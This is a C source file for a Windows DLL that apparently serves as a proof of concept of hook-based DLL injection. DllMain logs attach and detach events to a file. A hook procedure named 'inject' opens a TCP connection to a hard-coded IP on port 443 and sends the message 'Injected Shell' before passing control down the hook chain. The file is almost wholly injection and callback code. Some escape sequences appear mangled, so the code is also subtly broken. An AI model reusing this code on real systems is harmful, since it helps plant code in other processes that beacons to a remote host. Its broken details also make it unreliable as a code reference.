#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

INT APIENTRY DllMain(HMODULE hDll, DWORD Reason, LPVOID Reserved)
{
	FILE *file;
	fopen_s(&file, "C:\temp.txt", "a+");

	switch(Reason)
	{
		case DLL_PROCESS_ATTACH:
			fprintf(file, "DLL attach function called.n");
			break;
		case DLL_PROCESS_DETACH:
			fprintf(file, "DLL detach function called.n");
			break;
		case DLL_THREAD_ATTACH:
			fprintf(file, "DLL thread attach function called.n");
			break;
		case DLL_THREAD_DETACH:
			fprintf(file, "DLL thread detach function called.n");
			break;
	}

	fclose(file);

	return TRUE;
}


int inject(int code, WPARAM wParam, LPARAM lParam)
{

	WSADATA wsa;
	SOCKET s;
	struct sockaddr_in server;
	char *message;

	printf("\nInitializing Winsock...");
	if(WSAStartup(MAKEWORD(2,2),&wsa) != 0)
	{
		printf("Failed. Error Code : %d", WSAGetLastError());
		return(CallNextHookEx(NULL, code, wParam, lParam));
	}

	printf("Initialized. \n");

	if((s = socket(AF_INET, SOCK_STREAM, 0 )) == INVALID_SOCKET)
	{
		printf("Could not create socket : %d", WSAGetLastError());
	}

	printf("Socket Created. \n");

	server.sin_addr.s_addr = inet_addr("192.168.146.130"); //ip address
	server.sin_family = AF_INET;
	server.sin_port = htons( 443 );

	if(connect(s, (struct sockaddr *)&server, sizeof(server)) < 0)
	{
		puts("connect error");
		return(CallNextHookEx(NULL, code, wParam, lParam));
	}

	puts("Connected");

	message = "Injected Shell";
	if( send(s, message, strlen(message), 0) <0)
	{
		puts("Send failed");
		return(CallNextHookEx(NULL, code, wParam, lParam));
	}
	puts("Data sent\n");

	return(CallNextHookEx(NULL, code, wParam, lParam));

}
